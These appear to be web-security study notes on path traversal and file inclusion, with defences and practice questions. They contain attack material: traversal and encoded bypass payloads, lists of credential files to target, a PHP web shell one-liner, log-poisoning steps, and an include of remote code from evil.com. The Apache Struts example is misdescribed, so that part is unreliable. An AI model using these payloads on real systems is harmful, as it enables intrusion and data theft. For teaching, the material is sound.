## 📂 Section: Manipulating File Paths (Path Traversal)

---

### 🎯 Core Concept

Web apps often take **user input as file or directory names**. If that input isn’t **validated**, attackers can **trick the app into reading or writing unintended files** — even system files.

This is called:

> 🔥 **Path Traversal (a.k.a. Directory Traversal)**

---

## 🧠 How It Works

Let’s say the application tries to fetch this image from the disk:

```
http://example.com/getImage?filename=cat.jpg
```

And behind the scenes, it does this:

```csharp
string fullPath = "C:\\images\\" + Request.QueryString["filename"];
```

So for:

```
filename = cat.jpg
```

It accesses:

```
C:\images\cat.jpg
```

Cool. But now we try:

```
filename=..\..\windows\win.ini
```

And now it tries to access:

```
C:\images\..\..\windows\win.ini ➜ becomes ➜ C:\windows\win.ini
```

🎯 Boom — we’re reading **system files** we’re never supposed to see.

---

## 📌 Real World Exploit Path

* Windows: `..\..\..\windows\win.ini`
* Linux: `../../../../etc/passwd`

These attacks can read:

* SSH private keys
* Source code
* DB credentials
* Server configs
* Application logs
* Or even **overwrite files** (if it allows writing)

---

## ⚠️ Impact

**If the app reads files based on user input**, it’s possible to:

* Dump system secrets
* Grab source code
* Chain into RCE if logs or configs are writable
* Poison configuration (via file write or log injection)

---

## 🔓 Real-World Example

**Vulnerable URL**:

```
http://mdsec.net/filestore/8/GetFile.ashx?filename=..\windows\win.ini
```

**Why it works**:

1. Input goes into: `C:\filestore\` → app builds path like:
   `C:\filestore\..\windows\win.ini`
2. `..` means “go back a directory” → ends up reading:
   `C:\windows\win.ini`

**Result**: You just accessed a system config file. No auth. No shell. No alerts.

---

## 🧠 Notes for Windows Targets

* File like `C:\windows\win.ini` is **publicly readable** by all users.
* On modern Windows servers, apps **run with limited permissions** — so always test with files readable by **low-privileged users**.

---

## 🧠 Practice Qs

1. What does `..\` mean in a file path?
2. What kind of files are good targets for path traversal on Linux? On Windows?
3. How can you bypass a filter that blocks `../` in URLs?
4. How would you test if a file parameter is vulnerable?
5. If an app runs with limited privileges, why is it still dangerous to read `win.ini` or `/etc/passwd`?

---

## 🔍 Locating Path Traversal Vulnerability

---

### 🎯 **1. Locating Potential Targets**

When scanning an application, always keep an eye out for **parameters that look like file or directory references**, such as:

* `file=report.pdf`
* `template=/templates/header.html`
* `path=/user/docs/terms.txt`
* `doc=invoice123`
* `download=/home/user/file.txt`
* `include=main.inc`

🧠 **Pro Tip:** You can often spot file access points in:

* Document upload/download features (email attachments, invoices, reports)
* Image galleries or media managers
* Blog themes or customizable templates
* Backup, export, or import tools
* Anything with dynamic includes or file preview

---

### ⚔️ **2. Detecting Path Traversal with Bypasses**

Now that you’ve found a file-handling parameter, it’s time to test if it’s vulnerable.

#### ✅ Step A: Confirm file access

Start with a **normal** file (if known):

```
file=example.txt
```

Then, test with a slightly modified version:

```
file=foo/bar/../example.txt
```

If both requests give the **same result**, that means the app is likely doing **path resolution (canonicalization)**. The `bar/../` part cancels itself out.

This tells us the app doesn’t sanitize traversal attempts — great sign!

---

#### ✅ Step B: Try traversing above root

Now go for the real test:

```
file=../../../../../../../../etc/passwd
```

or (on Windows):

```
file=..\..\..\..\..\..\..\windows\win.ini
```

🧠 Use *many* levels of `../` just in case the app prepends a very deep root path.

If it works and shows you the file? That’s **full-blown path traversal**.

---

#### 🔀 Step C: Test both read & write access

* If it reads files: try pulling `passwd`, `shadow`, `application.properties`, or `.env`.
* If it writes files: try this…

On Windows:

```
file=../../../../../../../writetest.txt
file=../../../../../../../windows/system32/config/sam
```

On Linux:

```
file=../../../../../../../tmp/writetest.txt
file=../../../../../../../tmp
```

If one file is written successfully but another fails (with a permission error), that’s strong evidence of a path traversal flaw **with write access**.

---

#### 🕵️ Tip: No output? Use a file monitoring tool

If you’re doing **whitebox testing** or testing on your **own lab**, use tools like:

* **Windows**: [Sysinternals FileMon](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
* **Linux**: `strace`, `ltrace`, or `auditd`
* **Solaris**: `truss`

Inject a known string like `traversaltest.txt` into each parameter. Then monitor the logs to see if your string ends up in the filesystem — that confirms file access is happening.

---

### 🧪 **Bypassing Filters (Advanced)**

Many apps try to block `../` or limit input to known files. But there are ways around that.

#### 🔒 Common Filters

* Block `../` directly
* Allow only `.jpg`, `.pdf`, etc.
* Encode traversal patterns

#### 🔓 Bypass Tricks

| Trick               | Example                               |
| ------------------- | ------------------------------------- |
| URL Encoding        | `%2e%2e%2f` = `../`                   |
| Double Encoding     | `%252e%252e%252f`                     |
| Mixed slashes       | Try both `/` and `\`                  |
| Null byte (old bug) | `filename=secret.txt%00.jpg`          |
| Adding junk         | `....//....//etc/passwd`              |
| Overlong UTF-8      | `..%c0%af..%c0%afetc/passwd`          |
| UTF-16 or UTF-32    | Advanced but useful in legacy systems |

🧠 Don't assume the platform — the front-end could be Linux, but the back-end might use a Windows share. Always try both styles of slashes.

---

### 💣 Real-World Example

#### 🔓 *Sony Pictures Hack (2014)*

In that breach, attackers reportedly used path traversal vulnerabilities to access sensitive configuration and password files. Once inside, they chained that with RCE vulnerabilities to deploy malware, extract emails, and dump TBs of confidential data.

#### 🔓 *Apache Struts CVE-2017-5638*

This infamous RCE flaw started with path manipulation inside a crafted `Content-Type` header — the attacker used OGNL (Object Graph Navigation Language) to traverse file paths and invoke Java classes for code execution.

---

### ✅ Summary & Defense Tips

| ✅ Do                     | ❌ Don’t                            |
| ------------------------ | ---------------------------------- |
| Use static file mappings | Let user control full paths        |
| Whitelist known files    | Blacklist extensions               |
| Validate input strictly  | Assume `../` is the only payload   |
| Use safe file APIs       | Use direct OS commands or includes |
| Log and monitor          | Ignore file access patterns        |

---

## 🔐 Practice Questions

1. **What’s the difference between path traversal and LFI?**
2. **How can you detect a path traversal flaw if you don’t see output in the browser?**
3. **Which Windows file is a safe default test target and why?**
4. **Name two techniques to bypass `../` filters.**
5. **If you can write to the file system, how can you escalate to RCE?**

---

### 🔐 Circumventing Obstacles to Traversal Attacks

Path Traversal is not new — developers know about it. So modern apps throw up defenses. The problem? Most of those defenses are flawed. Your job as an attacker is to find clever ways to **bypass filters** and still escape the root directory cage.

---

#### 🎭 Real-World Obstacle Types

##### 1. **Basic Path Traversal Filtering**

* The app sees `../` and says: “Nope, not today.”
* You get blocked or cleaned input.

🔧 **Bypass Techniques (Filter Evasion Arsenal):**

| Technique                          | Explanation                                                                       |
| ---------------------------------- | --------------------------------------------------------------------------------- |
| **Backslashes vs Forward Slashes** | Try both `..\` and `../`. Filters often block only one.                           |
| **URL Encoding**                   | `../` becomes `%2e%2e%2f` or `%2e%2e%5c`. Try encoding dots and slashes.          |
| **Unicode Encoding**               | Example: `%u002e%u002e%u2215` for `../`. Often bypasses poor regex-based filters. |
| **Double Encoding**                | `%252e%252e%252f` (this is `%25` for `%`, then `2e` or `2f`)                      |
| **Overlong UTF-8**                 | `%c0%ae`, `%c0%2e`, etc. Often works in misconfigured Unicode decoders.           |
| **Nested Traversals**              | Filters don’t apply recursively? Use `..../` or `....//` to sneak past.           |

🔍 **Tool Tip:** In Burp Intruder, you can use `Illegal Unicode` payload types to automate generation of weird encodings that might break poorly implemented filters.

---

##### 2. **Suffix / Prefix Validation**

These try to lock your path to certain directories or file types:

* ❌ `"filename must end in .jpg"`
* ❌ `"must start with /user/files/"`

✅ **Bypass Techniques**:

| Scenario              | Bypass                                                                           |
| --------------------- | -------------------------------------------------------------------------------- |
| **Suffix validation** | Add `%00.jpg` (null byte). Old trick but still works in some Java or PHP setups. |
| **Forced suffix**     | If app appends `.jpg`, your input: `../../etc/passwd%00`                         |
| **Prefix validation** | Just bypass it like: `filestore/../../../../etc/passwd`                          |

💡 **Combo Moves**: Use encoding tricks + suffix bypass to defeat multiple layers.

---

### 😈 Custom Encoding and Wacky Implementations

> **Real-World Story (from the book):**
> A server used a custom base64-like encoding for filenames in download URLs. Uploading a file with a weird path like `../../../../.././etc/passwd/../../tmp/file` made the encoded filename longer — indicating no canonicalization. By truncating the encoded path at the right spot, the attacker bypassed the logic and downloaded `/etc/passwd`.

**Lesson:** Just because something looks “secure” or “obfuscated” doesn’t mean it is.

🔓 **Hack Trick**: Upload with a path you control, observe how it gets encoded → truncate to reach forbidden file paths.

---

### 🎯 Exploiting Traversal Vulnerabilities (Read & Write)

---

#### 🧠 Read Access: Juicy Files to Target

You don’t just want files. You want **valuable intel**. Here’s your loot list:

| File                                                 | Use                                     |
| ---------------------------------------------------- | --------------------------------------- |
| `/etc/passwd`                                        | User enumeration on Linux               |
| `/proc/self/environ`                                 | May contain sensitive env vars          |
| Config files (`config.php`, `web.config`, `db.conf`) | Contains creds, keys, DB info           |
| Log files                                            | Session tokens, usernames, IPs          |
| Source code (`.php`, `.jsp`, `.aspx`)                | Find hidden parameters, hardcoded logic |
| `.bash_history`                                      | Admin command history                   |

🧪 Try:
`GET /download?file=../../../../etc/passwd`
`GET /view?doc=../../../../var/log/nginx/access.log`

---

#### 💥 Write Access: From Bug to RCE

When you can write to the filesystem, your goal is simple:

> **Drop a web shell or executable payload and trigger it.**

| Strategy                           | Description                                                                           |
| ---------------------------------- | ------------------------------------------------------------------------------------- |
| **Write to webroot**               | Upload a PHP shell like `<?php system($_GET['cmd']); ?>` as `/var/www/html/shell.php` |
| **Overwrite config/startup files** | Modify `.bashrc`, crontabs, or startup scripts                                        |
| **Replace binaries or logs**       | If writable, overwrite scripts or use log injection (`> /var/www/html/shell.php`)     |
| **Symlink abuse**                  | Create symbolic links to sensitive files, if allowed                                  |

⚠️ **Constraints**: Most modern apps run under low-privilege users like `www-data`, so writing to sensitive directories might fail. But temp dirs like `/tmp`, log folders, or misconfigured webroots might still be writable.

---

### 🧪 Hack Steps Summary

| Stage              | Action                                                           |
| ------------------ | ---------------------------------------------------------------- |
| **Recon**          | Identify parameters related to filenames, directories, templates |
| **Testing**        | Use `../` or encoding tricks to test traversal                   |
| **Bypass Filters** | Apply double/triple encoding, recursive evasion                  |
| **Exploit Read**   | Dump config files, logs, creds, source code                      |
| **Exploit Write**  | Upload web shells, modify startup configs                        |
| **RCE**            | Trigger uploaded shell via browser or SSRF                       |

---

### 🧠 Pro Tip: Don't Forget About LFI + Traversal Chain

Sometimes traversal alone doesn’t get RCE. But chaining it with **Local File Inclusion** can lead to full compromise:

* LFI + traversal → include `/var/log/apache2/access.log` which contains PHP code you injected via User-Agent.
* LFI + traversal → include session file or `/proc/self/environ`.

---

## 🎯 **Preventing Path Traversal Vulnerabilities**

Don’t trust users. Ever.

Even something as innocent as this:

```
GET /download?file=invoice.pdf
```

…can be twisted into:

```
GET /download?file=../../../../etc/passwd
```

---

## 🔒 Part 1: Don’t Use User Input in File Paths — At All

### ✅ **Best Practice**

Avoid passing *any* user input to the filesystem API (like `fopen()`, `read()`, `File.read()`).

#### 💡 Example:

**BAD:**

```php
$path = "/var/www/uploads/" . $_GET["file"];
readfile($path);  // dangerous
```

**GOOD:**
Serve files directly from public directories:

```html
<img src="/images/logo.jpg" />
```

No dynamic logic = no attack surface.

---

## 🔢 Part 2: If You *Must* Use Input, Use **File Indexing**

Instead of taking actual file names, use **IDs mapped to safe names**.

### ✅ Example:

```php
$files = [
    1 => "keira.jpg",
    2 => "report.pdf",
];

$id = $_GET["id"];

if (isset($files[$id])) {
    readfile("/var/app/static/" . $files[$id]);
}
```

User can’t send `../../../../` — because `id=1` maps directly to a hardcoded safe filename.

---

## 🛡️ Part 3: If You STILL Let Users Supply Filenames — Use Layered Defenses

If your app does something like:

```
GET /getfile?filename=document.pdf
```

Here’s what you **must** do to keep it bulletproof:

---

### 🔍 1. **Decode and Canonicalize** FIRST

Unwrap everything. No shortcuts.

You should decode:

* URL encoding (`%2e`, `%2f`)
* Unicode (`%u002e`, `%u2215`)
* Double-encoding (`%252e`)
* UTF-8 overlongs (`%c0%ae`)

**Why?** Because attackers try to hide traversal using weird encoding tricks.

---

### 🔐 2. **Hard-Fail on Traversal Indicators**

Once decoded, look for:

* `../` or `..\`
* Null bytes (`%00`)
* Any `/` or `\` sneaked into the path

If found — **immediately reject** the request. Don’t try to “fix” it. Don’t be cute. Just block it.

---

### 📂 3. **Whitelist File Types**

Only allow `.jpg`, `.png`, etc. Reject anything else.

Don’t check **before decoding** — do it **after** canonicalization. Otherwise someone can do:

```
file=../../etc/passwd%00.jpg
```

Looks like `.jpg`, but after decoding it’s just `/etc/passwd`.

---

### 🧠 4. **Validate Final File Path — With Canonical Path Check**

Here’s the **pro trick** most developers skip.

After building the full file path, resolve its **canonical (absolute) path**, then check if it starts with the **base directory**.

#### ✅ Java:

```java
File f = new File(baseDir, userInput);
String canonicalPath = f.getCanonicalPath();

if (!canonicalPath.startsWith(baseDir)) {
    throw new SecurityException("Traversal attempt detected!");
}
```

#### ✅ .NET:

```csharp
string fullPath = Path.GetFullPath(userInput);
if (!fullPath.StartsWith(baseDir)) {
    throw new SecurityException();
}
```

---

## 🔐 Part 4: Use Chroot / Virtual Drive Isolation

Let the OS help you.

### 🧱 UNIX: chroot jail

Restricts the app to a directory. Even `../../../` can’t go outside.

### 🪟 Windows: Map a directory as a drive

Mount `/secure/files/` as `Z:\` and access only that drive.

That way, even if traversal works, it can’t escape the sandbox.

---

## 🚨 Part 5: Detect and Respond to Attacks

Every time someone sends this:

```
GET /file?name=../../etc/passwd
```

That’s an attack attempt.

Here’s what you do:

* **Log** it
* **Terminate** the session
* **Alert** admins
* (Optional) **Suspend** account

Don’t ignore probing attempts. Every LFI or path traversal chain starts with one of these probes.

---

## 🧠 Real-World Case Example

A company had:

```
/download?file=report2023.pdf
```

They tried to prevent traversal by blocking `../`.

But attacker used:

```
file=....//....//etc/passwd
```

It bypassed their basic filter.

**Why?** Because:

* Filter didn’t normalize path
* Didn’t check canonical path
* Didn’t use hard path check with `getCanonicalPath`

Boom — LFI ➝ config files leaked ➝ DB creds leaked ➝ RCE via DB shell write.

---

## 🧪 Quick Knowledge Check (Your Turn)

1. What’s the safest way to deliver static files to users?
2. If you need to use user input to reference files, what design strategy prevents traversal?
3. What are two critical steps developers often miss when decoding user-supplied filenames?
4. How does `getCanonicalPath()` help prevent traversal?
5. What’s the use of chroot in path traversal mitigation?
6. How can null byte (`%00`) be used to bypass file type filters?
7. If you're building a file viewer that shows user uploads — how would you design it to be secure?
8. Why should traversal attempts be logged and responded to?

---

## 🔥 Section: **File Inclusion Vulnerabilities**

File inclusion is like giving the user a remote control that can decide **which code files the server should execute** — and if that control isn't restricted, things can go south real fast.

File inclusion bugs are especially dangerous when combined with:

* **Arbitrary file execution**
* **Remote fetching of malicious files**
* **Path traversal for privilege escalation**

---

### 🧨 **Remote File Inclusion (RFI)**

Remote File Inclusion happens when the app lets users **specify an external (remote) file path**, and then **includes and executes that file** as part of the server-side logic.

---

#### 🧪 Real-World Example:

```php
$country = $_GET['Country'];
include($country . '.php');
```

So if a normal user visits:

```
https://wahh-app.com/main.php?Country=US
```

The server internally does:

```
include('US.php'); // from the local file system
```

But a malicious attacker could do:

```
https://wahh-app.com/main.php?Country=http://evil.com/shell
```

And now this happens:

```php
include('http://evil.com/shell'); // fetched and executed
```

That’s **instant RCE** — Remote Code Execution — just by loading external malicious PHP code.

> 🛑 *Only languages like PHP allow this kind of remote file loading in their default configurations (if `allow_url_include` is enabled).*

---

### 🐍 **Local File Inclusion (LFI)**

Local File Inclusion happens when the app uses **user input to include files from its own file system** (not remote URLs). It may not be as flashy as RFI, but it’s still deadly.

---

#### 🧪 Local Example:

```asp
Server.Execute(user_supplied_input)
```

Even if the app blocks you from visiting `/admin`, you can do:

```
Server.Execute("/admin/secret_panel.asp")
```

Now you’ve **included protected admin code** into a page that you *can* access.

---

### 🚩 What can LFI do?

* **Leak source code**
* **Bypass access control** (include restricted modules)
* **Leak configuration or logs**
* **Escalate to RCE** when paired with file write (e.g., log poisoning)

---

### 🔍 **Finding File Inclusion Vulnerabilities**

These bugs often hide in parameters like:

* `lang=en`
* `Country=US`
* `template=dashboard.php`
* `page=contact`

You're looking for anything that **suggests dynamic file loading** based on user input.

---

## 🛠️ HACK STEPS — How to Find Inclusion Vulnerabilities

---

### 🧬 Remote File Inclusion (RFI)

1. **Inject a remote URL you control** into the target parameter:

   ```
   Country=http://yourhost.com/test.php
   ```

   ✅ If the server makes a request to your host — bingo, it's fetching your file.

2. **Inject a non-existent IP (e.g., 192.0.2.123):**

   ```
   Country=http://192.0.2.123/malicious.php
   ```

   ✅ If the page loads slowly or times out, that means the server tried to reach it.

3. **Exploit it by uploading your malicious script** (like a PHP web shell) on your server and reference it in the include.

   ✅ That’s **instant RCE**.

> ⚠️ *RFI is rare today because most servers disable `allow_url_include`, but it’s still a high-impact bug when found.*

---

### 🧬 Local File Inclusion (LFI)

1. **Try loading a known internal server file**, like a page or script:

   ```
   page=login
   page=admin_panel
   ```

2. **Try to include static files (non-PHP):**

   ```
   page=../../../../../etc/passwd
   ```

   ✅ If you see password file contents, it’s LFI + traversal.

3. **Include restricted functionality:**

   * Try loading `/admin`, `/config`, or `/secret`
   * This may **bypass access control** if the file is included and not directly accessed.

4. **Combine with traversal** to expand your access:

   ```
   page=../../../../../var/log/apache2/access.log
   ```

   ✅ Could let you **read logs** or even **execute code via log poisoning**.

---

## 🛡️ Key Differences Between RFI & LFI

| Property           | RFI                                  | LFI                                               |
| ------------------ | ------------------------------------ | ------------------------------------------------- |
| Source of file     | External URL                         | Local file system                                 |
| Common language    | PHP                                  | PHP, ASP, JSP, etc.                               |
| Impact             | Instant remote code execution        | File disclosure, code inclusion, RCE via chaining |
| Current prevalence | Low (due to `allow_url_include=off`) | High                                              |

---

## 🔥 Real-World LFI Exploitation Chain

Let’s say LFI is found in:

```
page=../../../../../var/log/apache2/access.log
```

If you can control log content (e.g., via User-Agent), then log poisoning allows:

```php
User-Agent: <?php system($_GET['cmd']); ?>
```

Now:

```
page=../../../../../var/log/apache2/access.log&cmd=whoami
```

✅ You just escalated LFI to RCE.

---

## 🧠 Recap Summary

* **File inclusion** bugs happen when user input controls which file gets loaded.
* **RFI** leads to **remote execution** by loading attacker-controlled code.
* **LFI** can read files, include protected code, or even escalate to **RCE** with help.
* Always test for inclusion by:

  * Including internal pages or known files.
  * Trying traversal to reach sensitive files.
  * Including external URLs (for RFI).
* **Modern filters aren’t perfect**, especially against LFI.

---

## ✅ Practice Questions (5 Only, Quality-Focused)

1. What PHP configuration must be enabled for Remote File Inclusion to work, and why is it dangerous?
2. How can you confirm whether a parameter is vulnerable to RFI during blackbox testing?
3. How can a Local File Inclusion vulnerability be escalated to Remote Code Execution?
4. Why is the parameter `Country=US` potentially dangerous in a PHP `include()` statement?
5. What's a common way to bypass access control using LFI?

---
